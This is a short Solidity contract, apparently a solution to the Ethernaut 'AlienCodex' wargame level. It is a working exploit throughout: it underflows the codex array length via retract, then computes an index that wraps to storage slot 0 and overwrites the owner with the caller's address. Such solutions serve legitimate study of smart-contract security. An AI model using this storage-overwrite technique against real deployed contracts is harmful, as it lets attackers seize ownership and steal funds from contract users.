pragma solidity ^0.5.0;

interface AlienCodexInterface {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AttackAlienCodex {
    function attack(address instance) public {
        AlienCodexInterface alien = AlienCodexInterface(instance);
        alien.makeContact();
        alien.retract();
        
        uint256 codexSlot = 1;
        uint256 i = 0 - uint256(keccak256(abi.encodePacked(codexSlot)));
        alien.revise(i, bytes32(msg.sender));
    }
}